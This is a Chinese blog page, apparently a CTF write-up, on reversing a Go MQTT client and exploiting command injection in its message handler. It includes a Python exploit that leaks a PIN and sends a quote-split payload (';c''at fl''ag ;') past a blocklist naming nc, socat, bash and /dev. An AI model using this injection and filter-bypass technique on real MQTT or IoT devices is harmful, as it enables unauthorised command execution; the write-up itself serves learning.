@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="ldz师傅分享了一道有趣的题目，在做题过程中本人收获颇丰，接触到了许多新的知识点，记录一下做题(学习过程)  前置知识学习在做题中接触的新知识较多，理解这些知识是搞懂题目逻辑的关键点，这里在篇首回顾一遍流程中学习的内容 go语言的逆向go语言生成的可执行程序一打开有点想c语言静态编译的样子，程序入口为main_main这里注意一般来说，main_任意名字代表这个函数&#x2F;变量是程序自定义的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mqtt2做题记录">
+<meta property="og:url" content="http://example.com/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="No_t1me&#39;s blog">
+<meta property="og:description" content="ldz师傅分享了一道有趣的题目，在做题过程中本人收获颇丰，接触到了许多新的知识点，记录一下做题(学习过程)  前置知识学习在做题中接触的新知识较多，理解这些知识是搞懂题目逻辑的关键点，这里在篇首回顾一遍流程中学习的内容 go语言的逆向go语言生成的可执行程序一打开有点想c语言静态编译的样子，程序入口为main_main这里注意一般来说，main_任意名字代表这个函数&#x2F;变量是程序自定义的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1.png">
+<meta property="article:published_time" content="2025-11-11T05:48:36.000Z">
+<meta property="article:modified_time" content="2025-11-11T07:20:17.900Z">
+<meta property="article:author" content="no_t1me">
+<meta property="article:tag" content="iot">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="reverse">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1.png">
+
+
+<link rel="canonical" href="http://example.com/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","path":"2025/11/11/mqtt2做题记录/","title":"mqtt2做题记录"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>mqtt2做题记录 | No_t1me's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">No_t1me's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">lost in binary</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">前置知识学习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#go%E8%AF%AD%E8%A8%80%E7%9A%84%E9%80%86%E5%90%91"><span class="nav-number">1.1.</span> <span class="nav-text">go语言的逆向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MQTT%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.2.</span> <span class="nav-text">MQTT协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MQTT-Broker"><span class="nav-number">1.2.1.</span> <span class="nav-text">MQTT Broker</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MQTT-Client"><span class="nav-number">1.2.2.</span> <span class="nav-text">MQTT Client</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MQTT-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="nav-number">1.2.3.</span> <span class="nav-text">MQTT 的工作流程：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">题目</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">no_t1me</p>
+  <div class="site-description" itemprop="description">逝者如斯夫，不舍昼夜</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/No-t1me" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;No-t1me" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:birty073@126.com" title="email → mailto:birty073@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>email</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          友情链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://ret2ldz.github.io/" title="https:&#x2F;&#x2F;ret2ldz.github.io" rel="noopener" target="_blank">ldz</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://www.jimmmmmiesblog.cn/" title="https:&#x2F;&#x2F;www.jimmmmmiesblog.cn" rel="noopener" target="_blank">Jimmy</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://aucept.in/" title="https:&#x2F;&#x2F;aucept.in" rel="noopener" target="_blank">Auceptin</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="no_t1me">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="No_t1me's blog">
+      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="mqtt2做题记录 | No_t1me's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          mqtt2做题记录
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-11-11 13:48:36 / 修改时间：15:20:17" itemprop="dateCreated datePublished" datetime="2025-11-11T13:48:36+08:00">2025-11-11</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>ldz师傅分享了一道有趣的题目，在做题过程中本人收获颇丰，接触到了许多新的知识点，记录一下做题(学习过程)</p>
+</blockquote>
+<h2 id="前置知识学习"><a href="#前置知识学习" class="headerlink" title="前置知识学习"></a>前置知识学习</h2><p>在做题中接触的新知识较多，理解这些知识是搞懂题目逻辑的关键点，这里在篇首回顾一遍流程中学习的内容</p>
+<h3 id="go语言的逆向"><a href="#go语言的逆向" class="headerlink" title="go语言的逆向"></a>go语言的逆向</h3><p>go语言生成的可执行程序一打开有点想c语言静态编译的样子，程序入口为<code>main_main</code>这里注意一般来说，<code>main_任意名字</code>代表这个函数&#x2F;变量是程序自定义的，而形如<code>runtime_writeBarrier()</code>类似的函数代表是go中runtime库对应的函数，另外题目中出现的<code>github_com_eclipse_paho_2emqtt_2egolang__ptr_ClientOptions_AddBroker()</code>这样的函数也是外部包导入的函数。</p>
+<p>go的字符串与c++有很大区别，是二进制安全的，它不以\0作为终止符，一个字符串对象在内存中分为两部分，一部分为如下结构，占两个机器字用于索引数据：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">type StringHeader <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">    Data uintptr            <span class="comment">// 字符串首地址</span></span><br><span class="line"> </span><br><span class="line">    Len  <span class="type">int</span>                <span class="comment">// 字符串长度</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而它的另一部分才存放真正的数据，它的大小由字符串长度决定，在逆向中重点关注的是如上结构，因此说一个string占两个机器字，其他结构也按这种约定。</p>
+<p>go语言一大特性就是用户层面实现的<strong>协程（Goroutine）</strong>，本质是轻量化的线程，能够轻松实现高并发，利用go函数启动一个Goroutine独立与主线程异步运行。对于协程的调度模型有非常多的内容，与本体无直接关联，具体实现可以参考：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/20862617">https://www.zhihu.com/question/20862617</a></p>
+<h3 id="MQTT协议"><a href="#MQTT协议" class="headerlink" title="MQTT协议"></a>MQTT协议</h3><p>MQTT（Message Queuing Telemetry Transport）是一种轻量级、基于发布-订阅模式的消息传输协议，适用于资源受限的设备和低带宽、高延迟或不稳定的网络环境。它在物联网应用中广受欢迎，能够实现传感器、执行器和其它设备之间的高效通信。</p>
+<h4 id="MQTT-Broker"><a href="#MQTT-Broker" class="headerlink" title="MQTT Broker"></a>MQTT Broker</h4><p>MQTT Broker 是负责处理客户端请求的关键组件，包括建立连接、断开连接、订阅和取消订阅等操作，同时还负责消息的转发。通常题目中会连接一个mqtt的brocker，绑定到一个开启mqtt服务的端口上，同时对于返回的<code>ClientOptions</code>进行连接函数绑定，消息处理函数绑定，新建一个<strong>mqtt客户端。</strong></p>
+<h4 id="MQTT-Client"><a href="#MQTT-Client" class="headerlink" title="MQTT Client"></a>MQTT Client</h4><p>任何运行 <a target="_blank" rel="noopener" href="https://www.emqx.com/zh/mqtt-client-sdk">MQTT 客户端库</a>的应用或设备都是 MQTT 客户端。例如，使用 MQTT 的即时通讯应用是客户端，使用 MQTT 上报数据的各种传感器是客户端，各种 <a target="_blank" rel="noopener" href="https://www.emqx.com/zh/blog/mqtt-client-tools">MQTT 测试工具</a>也是客户端。</p>
+<h4 id="MQTT-的工作流程："><a href="#MQTT-的工作流程：" class="headerlink" title="MQTT 的工作流程："></a>MQTT 的工作流程：</h4><ol>
+<li><strong>客户端使用 TCP&#x2F;IP 协议与 Broker 建立连接</strong>，可以选择使用 TLS&#x2F;SSL 加密来实现安全通信。客户端提供认证信息，并指定会话类型（Clean Session 或 Persistent Session）。</li>
+<li><strong>客户端既可以向特定主题发布消息，也可以订阅主题以接收消息</strong>。当客户端发布消息时，它会将消息发送给 MQTT Broker；而当客户端订阅消息时，它会接收与订阅主题相关的消息。**同时注意在用户端可以将特定主题绑定特定的massage_handler函数，实现接收到主题消息回调。**一个客户端也可以绑定一个连接函数，代表连接上brocker执行的动作，一般为subscribe一些主题</li>
+<li><strong>MQTT Broker 接收发布的消息</strong>，并将这些消息转发给订阅了对应主题的客户端。它根据 QoS 等级确保消息可靠传递，并根据会话类型为断开连接的客户端存储消息。</li>
+</ol>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>终于到题目了，这个题目其实就是利用go中的<code>github_com_eclipse_paho_2emqtt_2egolang</code>外部库连接到本地的brocker，创建了客户端，同时绑定了连接函数自动subscribe CTF主题，消息回调函数message_handler(具有命令执行漏洞)。并创建一个<code>Goroutine</code>每隔一段时间在<strong>CTF&#x2F;send</strong>主题下publihs一个泄露ping码的信息。注意对于这种题目的pwn方法是：我们需要自己写一个MQTT Client，通过利用这个有漏洞的MQTT Client从而getflag。</p>
+<p>思路还是比较清晰的：创建题目中对应broker服务器的连接，根据题目subscribe的主题publish相应内容的信息从而触发有漏洞消息回调函数getflag。</p>
+<p>题目文件中对于mqtt client的初始化：<img src="/2025/11/11/mqtt2%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1.png"></p>
+<blockquote>
+<p>注意这里直接在**<code>ClientOptions</code>**结构体中声明massage_handler代表该客户端只要收到自己subscribe的主题publish的消息就会触发</p>
+</blockquote>
+<p>massage_handler函数中逻辑比较简单：解析json消息格式，提取auth，cmd，arg字段。先检查auth内容是否长度为6且等于特定加密算法后的pin值前6位，然后判断cmd中字段是否等于<code>get_version</code>或者<code>set_vin</code>：get_version打开&#x2F;mnt&#x2F;version文件输出内容；set_vin将arg内容拼接到echo -n %s &gt; &#x2F;mnt&#x2F;VIN中。注意这里对于参数进行了比较严苛的子字符串检测常用的显示函数如<code>cat,tail以及flag</code>都被ban了。这里用‘’阶段一下cat以及flag，同时利用<code>;</code>注入命令，就能把flag内容带出来了。</p>
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> paho.mqtt <span class="keyword">import</span> client <span class="keyword">as</span> mqtt_client</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">broker = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"><span class="comment"># Generate a Client ID with the publish prefix.</span></span><br><span class="line">client_id = <span class="string">f&#x27;publish-<span class="subst">&#123;random.randint(<span class="number">0</span>, <span class="number">1000</span>)&#125;</span>&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;public&#x27;</span></span><br><span class="line">main_lookup=[]</span><br><span class="line">received_pin=<span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    main_lookup.append ((<span class="number">37</span> * i + <span class="number">13</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize_connect</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_connect</span>(<span class="params">client, userdata, flags, reasonCode, properties=<span class="literal">None</span></span>):</span><br><span class="line">        client.subscribe(<span class="string">&quot;CTF&quot;</span>)</span><br><span class="line">        client.subscribe(<span class="string">&quot;CTF/send&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Connection created with topics subscribed&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">client, userdata, msg</span>):</span><br><span class="line">        message=msg.payload</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line">        data = json.loads(msg.payload.decode())</span><br><span class="line">        received_pin = data[<span class="string">&quot;pin&quot;</span>] </span><br><span class="line"></span><br><span class="line">    <span class="comment">#接下来进行与mqtt服务端连接的初始化</span></span><br><span class="line">    client = mqtt_client.Client(mqtt_client.CallbackAPIVersion.VERSION2, client_id)</span><br><span class="line">    client.on_connect = on_connect</span><br><span class="line">    client.on_message = on_message<span class="comment">#绑定连接的回调函数</span></span><br><span class="line">    client.connect(broker, port, keepalive=<span class="number">10000</span>)<span class="comment">#连接服务器</span></span><br><span class="line">    <span class="keyword">return</span> client</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrpyt</span>(<span class="params">buf</span>):</span><br><span class="line">    ans=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        tmp1=main_lookup[<span class="built_in">ord</span>(buf[i])]</span><br><span class="line">        out_byte=tmp1 - <span class="number">95</span>*((<span class="number">345</span>*tmp1)&gt;&gt;<span class="number">15</span>) + <span class="number">32</span></span><br><span class="line">        ans.append(<span class="built_in">chr</span>(out_byte))</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">auth:<span class="built_in">str</span>, cho_cmd:<span class="built_in">int</span>, arg:<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> cho_cmd == <span class="number">1</span>:</span><br><span class="line">        cmd = <span class="string">&quot;get_version&quot;</span></span><br><span class="line">    <span class="keyword">else</span> :cmd = <span class="string">&quot;set_vin&quot;</span></span><br><span class="line"></span><br><span class="line">    message = &#123;</span><br><span class="line">        <span class="string">&quot;auth&quot;</span>: auth,</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>: cmd,</span><br><span class="line">        <span class="string">&quot;arg&quot;</span>: arg</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#禁用列表：cat more head tail string awk sed cut xxd hexdump cmp diff base64 | &amp; $( 0x60 &gt; &lt; &gt;&gt; &lt;&lt; || &amp;&amp; sh  bash exec nc socat teknet ftp ... flag /dev .. gzip tar :method: :path :scheme :status accept-charset accept-encoding accept-language accept-range accept &quot;access-control-allow-origin age</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    client = initialize_connect()</span><br><span class="line">    client.loop_start()</span><br><span class="line">    client.publish(<span class="string">&quot;CTF/send&quot;</span>, <span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#泄露ping值</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#这里用publish CTF/send泄露pin值</span></span><br><span class="line">    mes = send_message(decrpyt(received_pin),<span class="number">0</span>,<span class="string">&#x27;;c\&#x27;\&#x27;at fl\&#x27;\&#x27;ag ;&#x27;</span>)<span class="comment">#从print内容中可以看到flag内容</span></span><br><span class="line">    client.publish(<span class="string">&quot;CTF&quot;</span>, json.dumps(mes))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line">    client.loop_stop()</span><br><span class="line">    client.disconnect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/reverse/" rel="tag"># reverse</a>
+              <a href="/tags/iot/" rel="tag"># iot</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/03/N1ctf%E4%B8%ADnipple%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" rel="prev" title="N1ctf中nipple题目复现">
+                  <i class="fa fa-angle-left"></i> N1ctf中nipple题目复现
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/11/12/EZVM%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="next" title="EZVM做题记录">
+                  EZVM做题记录 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">no_t1me</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
